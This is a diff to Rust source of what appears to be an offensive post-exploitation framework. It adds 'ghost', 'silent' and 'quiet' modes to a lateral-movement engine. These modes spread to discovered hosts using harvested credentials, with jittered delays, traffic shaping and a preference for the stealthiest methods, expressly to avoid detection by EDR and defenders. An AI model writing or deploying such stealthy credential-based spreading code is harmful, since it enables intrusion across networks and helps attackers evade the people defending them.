@@ -42,6 +42,7 @@ use crate::core::module::{
     CheckResult, Module, ModuleInfo, ModuleOption, ModuleResult, ModuleType, Platform, Session,
 };
 use crate::modules::post::credential_harvester::{CredentialType, HarvestedCredential, Sensitivity};
+use crate::modules::evasion::opsec::{OpsecConfig, DefaultTrafficShaper, TrafficShaper};
 
 // ============================================================================
 // Core Types
@@ -2696,6 +2697,178 @@ impl LateralMovementEngine {
     /// Get method by name
     pub fn get_method(&self, name: &str) -> Option<&dyn LateralMovement> {
         self.methods.iter().find(|m| m.name() == name).map(|m| m.as_ref())
+    }
+
+    // =========================================================================
+    // OPSEC Integration Methods
+    // =========================================================================
+
+    /// Spread with maximum stealth (Ghost mode OPSEC)
+    ///
+    /// Uses Ghost-level OPSEC configuration:
+    /// - 45+ second sleep between operations with 50-80% jitter
+    /// - Only 1-3 network packets per target
+    /// - EDR-aware execution
+    /// - LOLBins-only where possible
+    pub async fn spread_ghost(
+        &mut self,
+        source: &Session,
+        credentials: &[HarvestedCredential],
+        max_targets: usize,
+        safe_mode: bool,
+    ) -> Result<Vec<SpreadResult>> {
+        self.spread_with_opsec(source, credentials, max_targets, OpsecConfig::ghost(), safe_mode).await
+    }
+
+    /// Spread with Silent mode OPSEC (high stealth, moderate speed)
+    pub async fn spread_silent(
+        &mut self,
+        source: &Session,
+        credentials: &[HarvestedCredential],
+        max_targets: usize,
+        safe_mode: bool,
+    ) -> Result<Vec<SpreadResult>> {
+        self.spread_with_opsec(source, credentials, max_targets, OpsecConfig::silent(), safe_mode).await
+    }
+
+    /// Spread with Quiet mode OPSEC (balanced stealth and speed)
+    pub async fn spread_quiet(
+        &mut self,
+        source: &Session,
+        credentials: &[HarvestedCredential],
+        max_targets: usize,
+        safe_mode: bool,
+    ) -> Result<Vec<SpreadResult>> {
+        self.spread_with_opsec(source, credentials, max_targets, OpsecConfig::quiet(), safe_mode).await
+    }
+
+    /// Spread with custom OPSEC configuration
+    ///
+    /// Applies traffic shaping, jitter, and stealth measures between
+    /// each lateral movement attempt to avoid detection.
+    pub async fn spread_with_opsec(
+        &mut self,
+        source: &Session,
+        credentials: &[HarvestedCredential],
+        max_targets: usize,
+        opsec_config: OpsecConfig,
+        safe_mode: bool,
+    ) -> Result<Vec<SpreadResult>> {
+        let mut results = Vec::new();
+        let traffic_shaper = DefaultTrafficShaper::new(opsec_config.clone());
+
+        info!(
+            stealth_level = %opsec_config.stealth_level.as_str(),
+            "Starting OPSEC-aware lateral movement"
+        );
+
+        // Discover targets first
+        let targets = self.discover_targets_internal(source, safe_mode).await?;
+        let targets: Vec<_> = targets.into_iter().take(max_targets).collect();
+
+        if targets.is_empty() {
+            info!("No targets discovered for OPSEC lateral movement");
+            return Ok(results);
+        }
+
+        info!(
+            target_count = targets.len(),
+            "OPSEC spread: processing targets with traffic shaping"
+        );
+
+        // Try each target with OPSEC-aware delays
+        for (idx, target) in targets.iter().enumerate() {
+            // Apply traffic shaping delay before each attempt (except first)
+            if idx > 0 {
+                debug!(
+                    target = %target.ip_address,
+                    "Applying OPSEC sleep with jitter before next target"
+                );
+                traffic_shaper.sleep_with_jitter().await;
+            }
+
+            // Use higher-stealth methods when in Ghost/Silent mode
+            let spread_results = if opsec_config.stealth_level >= crate::modules::evasion::opsec::StealthLevel::Silent {
+                // Prefer stealthier methods
+                self.spread_stealthy_methods(source, target, credentials, safe_mode).await?
+            } else {
+                self.spread_multi_method(source, target, credentials, safe_mode).await?
+            };
+
+            for result in spread_results {
+                if result.success {
+                    self.spread_history.push(result.clone());
+                    info!(
+                        target = %target.ip_address,
+                        method = %result.method_name,
+                        "OPSEC spread successful"
+                    );
+                }
+                results.push(result);
+            }
+        }
+
+        Ok(results)
+    }
+
+    /// Spread using only stealthier methods (for high OPSEC modes)
+    async fn spread_stealthy_methods(
+        &self,
+        source: &Session,
+        target: &Target,
+        credentials: &[HarvestedCredential],
+        safe_mode: bool,
+    ) -> Result<Vec<SpreadResult>> {
+        let mut results = Vec::new();
+
+        // Filter to only high-stealth methods
+        let stealthy_methods: Vec<_> = self.methods
+            .iter()
+            .filter(|m| {
+                m.can_target(target, credentials)
+                && m.stealth_level() >= StealthLevel::High
+            })
+            .collect();
+
+        if stealthy_methods.is_empty() {
+            // Fall back to any available method if no stealthy ones available
+            return self.spread_multi_method(source, target, credentials, safe_mode).await;
+        }
+
+        // Sort by stealth level (highest first), then by success probability
+        let mut ranked: Vec<_> = stealthy_methods
+            .into_iter()
+            .map(|m| (m, m.stealth_level(), m.success_probability(target, credentials)))
+            .collect();
+
+        ranked.sort_by(|a, b| {
+            match b.1.cmp(&a.1) {
+                std::cmp::Ordering::Equal => b.2.partial_cmp(&a.2).unwrap_or(std::cmp::Ordering::Equal),
+                other => other,
+            }
+        });
+
+        // Try top 2 stealthiest methods only
+        for (method, _stealth, _prob) in ranked.into_iter().take(2) {
+            let spread_results = method
+                .spread(source, credentials, std::slice::from_ref(target), safe_mode)
+                .await;
+
+            match spread_results {
+                Ok(mut res) => {
+                    if res.iter().any(|r| r.success) {
+                        results.append(&mut res);
+                        break; // Success - don't try more methods
+                    }
+                    results.append(&mut res);
+                }
+                Err(e) => {
+                    debug!(method = method.name(), error = %e, "Stealthy method failed");
+                }
+            }
+        }
+
+        Ok(results)
     }
 }
 
